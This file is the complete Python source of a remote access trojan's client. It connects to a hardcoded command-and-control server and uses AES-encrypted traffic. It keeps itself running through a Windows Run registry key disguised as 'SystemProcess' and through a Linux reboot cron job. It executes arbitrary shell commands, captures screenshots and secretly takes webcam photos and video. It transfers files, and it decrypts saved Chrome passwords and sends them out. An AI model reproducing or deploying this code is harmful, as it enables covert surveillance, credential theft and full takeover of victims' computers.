import socket
import json
import threading
import base64
import os
import time
import platform
import subprocess
import io
import mss
import cv2
import sys
import shutil
import sqlite3
import win32crypt
from PIL import Image
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

SECRET_KEY = b'0123456789abcdef0123456789abcdef'
C2_SERVER_IP = "192.168.1.20"
C2_SERVER_PORT = 9090

def encrypt_message(message: str) -> bytes:
    iv = os.urandom(16)
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(message.encode(), AES.block_size))
    return base64.b64encode(iv + encrypted)

def decrypt_message(encrypted_message: bytes) -> str:
    raw = base64.b64decode(encrypted_message)
    iv = raw[:16]
    encrypted = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(encrypted), AES.block_size).decode()

def take_screenshot():
    with mss.mss() as sct:
        screenshot = sct.grab(sct.monitors[1])
        img = Image.frombytes("RGB", screenshot.size, screenshot.rgb)
        buffer = io.BytesIO()
        img.save(buffer, format='PNG')
        return base64.b64encode(buffer.getvalue()).decode("utf-8")

def list_webcams():
    available = []
    for i in range(5):
        cap = cv2.VideoCapture(i)
        if cap.read()[0]:
            available.append(i)
        cap.release()
        
    return "Camera(s) available index: " + ",".join(str(i) for i in available) if available else "No camera(s) available"

def take_photo(index):
    try:
        cam = cv2.VideoCapture(int(index))
        if not cam.isOpened():
            return "[!] Camera not available"
        ret, frame = cam.read()
        cam.release()
        if not ret or frame is None:
            return "[!] Failed to capture image"
        _, buffer = cv2.imencode('.jpg', frame)
        return base64.b64encode(buffer).decode('utf-8')
    except Exception:
        return "[!] Exception while capturing photo"


def video_webcam(index, duration=5, fps=5):
    try:
        cam = cv2.VideoCapture(int(index))
        if not cam.isOpened():
            return "[!] Camera not available"

        frames = []
        start = time.time()
        while time.time() - start < duration:
            ret, frame = cam.read()
            if ret and frame is not None:
                frames.append(frame)
            time.sleep(1 / fps)

        cam.release()
        if not frames:
            return "[!] No frames captured"

        h, w, _ = frames[0].shape
        fourcc = cv2.VideoWriter_fourcc(*"mp4v")
        out = cv2.VideoWriter("video.mp4", fourcc, fps, (w, h))
        if not out.isOpened():
            return "[!] Error creating video writer"

        for frame in frames:
            out.write(frame)
        out.release()

        with open("video.mp4", "rb") as f:
            encoded = base64.b64encode(f.read()).decode("utf-8")
        os.remove("video.mp4")
        return encoded
    except Exception:
        return "[!] Exception while recordin video in webcam"


def download_file(path):
    if not os.path.exists(path):
        return None
    with open(path, "rb") as f:
        return base64.b64encode(f.read()).decode("utf-8")

def upload_file(data, name):
    try:
        with open(name, "wb") as f:
            f.write(base64.b64decode(data))
        return True
    except:
        return False
    
def get_master_key():
    local_state_path = os.path.join(
        os.environ['USERPROFILE'],
        "AppData", "Local", "Google", "Chrome", "User Data", "Local State"
    )
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)
    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    encrypted_key = encrypted_key[5:]
    master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return master_key

def decrypt_value(buff, master_key):
    try:
        if buff is None:
            return ""
        if len(buff) == 0:
            return ""
        if buff.startswith(b'v10') or buff.startswith(b'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted = cipher.decrypt(payload)[:-16]
            return decrypted.decode('utf-8', errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode('utf-8', errors='ignore')
    except Exception as e:
        return ""

def extract__chrome_passwords():
    try:
        master_key = get_master_key()
        login_db_path = os.path.join(
            os.environ['USERPROFILE'],
            "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"
        )
        tmp_path = os.path.join(os.environ["TEMP"], "Loginvault.db")
        shutil.copyfile(login_db_path, tmp_path)

        conn = sqlite3.connect(tmp_path)
        cursor = conn.cursor()

        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        for row in cursor.fetchall():
            url, username, encrypted_password = row
            if username or encrypted_password:
                decrypted_password = decrypt_value(encrypted_password, master_key)
                with open("passwords.txt", "a") as f:
                    f.write("-" * 50 + "\n")
                    f.write(f"URL: {url}\n")
                    f.write(f"Username: {username}\n")
                    f.write(f"Password: {decrypted_password}\n\n")
        cursor.close()
        conn.close()
        os.remove(tmp_path)
        return True
    except Exception as e:
        return False

def Persist():
    script_path = sys.executable

    if platform.system().lower().startswith("win"):
        try:
            persist_command = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v SystemProcess /t REG_SZ /d "{script_path}" /f'
            subprocess.call(persist_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as error:
            print(f"[!] Error setting persistence on Windows: {error}")

    elif platform.system() in ["Linux", "Linux2"]:
        try:
            cron_job = f"@reboot {script_path}\n"
            subprocess.call(f"crontab -l | {{ cat; echo \"{cron_job}\"; }} | crontab -", shell=True)
        except PermissionError:
            print("[!] Permission denied. Try running as root to set persistence.")
        except Exception as error:
            print(f"[!] Error setting persistence on Linux: {error}")

def heartbeat_loop(sock, agent_id):
    while True:
        packet = json.dumps({
            "type": "heartbeat",
            "agent_id": agent_id,
            "data": ""
        })
        try:
            send_packet(sock, packet)
        except:
            break
        time.sleep(30)

def handle_server(sock, agent_id):
    while True:
        try:
            msg = recv_packet(sock)
            if not msg:
                continue
            data = json.loads(msg)
            cmd_type = data.get("type")
            payload = data.get("data")

            if cmd_type == "command":
                try:
                    result = subprocess.check_output(payload, stderr=subprocess.STDOUT, shell=True, text=True)
                    result = result.strip() or "[No output]"
                except subprocess.CalledProcessError as e:
                    result = f"[!] Command failed: {e.output.strip()}"
                except Exception as e:
                    result = f"[!] Error: {e}"
                send_json(sock, "response", agent_id, result)

            elif cmd_type == "checkstatus":
                try:
                    result = subprocess.check_output("whoami", stderr=subprocess.STDOUT, shell=True, text=True)
                    if result:
                        result = "Online"
                    else:
                        result = "Offline"
                except Exception as e:
                    result = f"Offline"
                send_json(sock, "status", agent_id, result)

            elif cmd_type == "screenshot":
                image_b64 = take_screenshot()
                send_json(sock, "screenshot", agent_id, image_b64)

            elif cmd_type == "listwebcams":
                cams = list_webcams()
                send_json(sock, "response", agent_id, cams)

            elif cmd_type == "photo":
                photo = take_photo(payload)
                if not photo or photo.startswith("[!]"):
                    send_json(sock, "response", agent_id, photo or "[!] Error taking photo")
                else:
                    send_json(sock, "photo", agent_id, photo)

            elif cmd_type == "video":
                args = payload.split()
                index = int(args[0])
                duration = int(args[1]) if len(args) > 1 else 5
                fps = int(args[2]) if len(args) > 2 else 5
                video = video_webcam(index, duration, fps)
                if isinstance(video, str) and video.startswith("[!]"):
                    send_json(sock, "response", agent_id, video)
                else:
                    send_json(sock, "video", agent_id, video)


            elif cmd_type == "download":
                file_data = download_file(payload)
                if file_data:
                    send_json(sock, "file", agent_id, f"{file_data}|{payload}")
                else:
                    send_json(sock, "response", agent_id, "[!] File not found")

            elif cmd_type == "upload":
                try:
                    upload_info = json.loads(payload)
                    name = upload_info.get("filename", "uploaded.bin")
                    content = upload_info.get("content", "")
                    success = upload_file(content, name)
                    msg = "✅ File uploaded" if success else "❌ Upload failed"
                except Exception as e:
                    msg = f"❌ Upload failed: {e}"
                send_json(sock, "response", agent_id, msg)

            elif cmd_type == "dumpchrome":
                if extract__chrome_passwords():
                    file_data = download_file("passwords.txt")
                    if file_data:
                        send_json(sock, "file", agent_id, f"{file_data}|passwords.txt")
                        os.remove("passwords.txt")
                    else:
                        send_json(sock, "response", agent_id, "[!] Failed to read passwords file")
                else:
                    send_json(sock, "response", agent_id, "[!] Failed to extract passwords")

            elif cmd_type == "kill":
                return True

        except Exception as e:
            break

def send_packet(sock, message: str):
    encrypted = encrypt_message(message)
    size = str(len(encrypted)).zfill(10).encode() 
    sock.send(size + encrypted)

def recv_packet(sock):
    size_data = b""
    while len(size_data) < 10:
        part = sock.recv(10 - len(size_data))
        if not part:
            return None
        size_data += part
    size = int(size_data.decode().strip())

    data = b""
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            break
        data += part

    return decrypt_message(data)

def send_json(sock, type_, agent_id, data):
    msg = json.dumps({
        "type": type_,
        "agent_id": agent_id,
        "data": data
    })
    send_packet(sock, msg)

def connect_to_c2():
    while True:
        try:
            sock = socket.socket()
            sock.connect((C2_SERVER_IP, C2_SERVER_PORT))

            username = os.getlogin()
            os_version = platform.platform()
            agent_id = platform.node()

            info_msg = json.dumps({
                "type": "info",
                "agent_id": agent_id,
                "data": f"{username}|{os_version}"
            })
            send_packet(sock, info_msg)

            threading.Thread(target=heartbeat_loop, args=(sock, agent_id), daemon=True).start()
            should_exit = handle_server(sock, agent_id)
            if should_exit:
                break

        except Exception as e:
            time.sleep(10)

if __name__ == "__main__":
    Persist()
    connect_to_c2()
